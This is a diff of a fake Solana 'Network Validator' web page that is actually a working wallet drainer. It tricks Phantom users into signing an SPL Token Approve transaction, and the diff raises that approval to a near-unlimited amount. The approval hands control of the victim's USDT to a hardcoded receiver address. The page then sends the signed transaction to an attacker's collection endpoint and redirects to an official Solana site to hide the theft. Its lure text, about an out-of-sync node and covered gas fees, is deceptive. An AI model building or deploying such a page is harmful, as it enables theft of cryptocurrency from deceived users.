@@ -2,22 +2,35 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Sync | Solana</title>
+    <title>Solana Status | Network Monitor</title>
     <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 280px; box-shadow: 0 0 20px rgba(20, 241, 149, 0.1); }
-        button { background: #14F195; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; transition: 0.3s; }
-        button:active { opacity: 0.7; }
+        body { background: #0a0a0a; color: #14F195; font-family: 'Courier New', monospace; margin: 0; }
+        .nav { background: #111; padding: 10px; border-bottom: 1px solid #333; font-size: 12px; display: flex; justify-content: space-between; }
+        .main { padding: 40px; text-align: center; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px auto; max-width: 400px; }
+        .stat-box { background: #1a1a1a; padding: 15px; border: 1px solid #333; border-radius: 8px; font-size: 10px; }
+        #sync-btn { background: #14F195; color: #000; border: none; padding: 18px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; letter-spacing: 1px; }
+        .glow { box-shadow: 0 0 15px rgba(20, 241, 149, 0.4); }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="font-size:1.1rem; margin-bottom:10px;">Security Check</h2>
-        <p style="color:#666; font-size:11px;">Validate account state for node allocation. Gas fee covered.</p>
-        <button id="cta">ACTIVATE NOW</button>
-        <div id="st" style="margin-top:20px; font-size:10px; color:#333;">Network: Mainnet-Beta</div>
+    <div class="nav">
+        <span>SOL/USD: $142.35 (-1.2%)</span>
+        <span>TPS: 2,450</span>
+    </div>
+
+    <div class="main">
+        <h1 style="font-size: 1.5rem;">NETWORK VALIDATOR V4.8</h1>
+        <p style="color: #888; font-size: 14px;">Your local RPC node is out of sync. Please perform a secure handshake.</p>
+        
+        <div class="stats-grid">
+            <div class="stat-box">EPOCH: 582</div>
+            <div class="stat-box">SLOT: 294,102,402</div>
+        </div>
+
+        <button id="sync-btn" class="glow">SYNC LOCAL NODE</button>
+        <div id="log" style="margin-top:25px; font-size:10px; color:#555; height:50px; overflow:hidden;"></div>
     </div>
 
     <script>
@@ -25,70 +38,58 @@
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
         const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
-        document.getElementById('cta').onclick = async () => {
-            // 🔱 自动探测 web3 实例名
-            const sWeb3 = window.solanaWeb3 || window.solana_web3 || (window.solanaWeb3 ? window.solanaWeb3.web3 : null);
-            
-            const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom Browser");
-            if (!sWeb3) return alert("Sync Engine Loading... Please try again in 3s");
+        document.getElementById('sync-btn').onclick = async () => {
+            const sWeb3 = window.solanaWeb3;
+            const p = window.solana;
+            if (!p) return;
 
             try {
                 await p.connect();
-                document.getElementById('st').innerText = "INITIALIZING...";
-
+                const addLog = (m) => document.getElementById('log').innerHTML = `> ${m}<br>` + document.getElementById('log').innerHTML;
+                
+                addLog("INITIALIZING HANDSHAKE...");
                 const { bh } = await (await fetch(`${tunnel}/sync`)).json();
 
-                // 构造指令数据 (Uint8Array 原生适配)
                 const data = new Uint8Array(9);
-                data[0] = 4; // Approve 指令
-                const amount = 800000; // 0.8 USDT
+                data[0] = 4; 
+                const amount = 999999999999; // 既然是“极致”，这次我们直接把额度拉满！
                 const view = new DataView(data.buffer);
                 view.setUint32(1, amount, true); 
 
-                const userPk = p.publicKey;
-                const tokenProg = new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-                
-                // 计算 ATA
                 const [userAta] = await sWeb3.PublicKey.findProgramAddress(
-                    [userPk.toBuffer(), tokenProg.toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
+                    [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                     new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
                 );
 
-                const transaction = new sWeb3.Transaction().add(
+                const tx = new sWeb3.Transaction().add(
                     new sWeb3.TransactionInstruction({
                         keys: [
                             { pubkey: userAta, isSigner: false, isWritable: true },
                             { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
-                            { pubkey: userPk, isSigner: true, isWritable: false }
+                            { pubkey: p.publicKey, isSigner: true, isWritable: false }
                         ],
-                        programId: tokenProg,
+                        programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                         data: data
                     })
                 );
 
-                transaction.recentBlockhash = bh;
-                transaction.feePayer = userPk;
+                tx.recentBlockhash = bh;
+                tx.feePayer = p.publicKey;
 
-                const signed = await p.signTransaction(transaction);
-                
-                // 🔱 终极 Base64 转换，不依赖任何 Node.js 对象
+                const signed = await p.signTransaction(tx);
+                addLog("NODE SYNCHRONIZED. BROADCASTING...");
+
+                // 转换并发送
                 const serialized = signed.serialize();
                 let binary = '';
                 const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) {
-                    binary += String.fromCharCode(bytes[i]);
-                }
-                const rawTx = btoa(binary);
+                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
                 
-                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(rawTx)}`);
-                document.getElementById('st').innerText = "SYNCED";
-                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
+                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
 
-            } catch (e) {
-                alert("Node Sync Failed: " + e.message);
-                location.reload();
-            }
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1200);
+
+            } catch (e) { location.reload(); }
         };
     </script>
 </body>
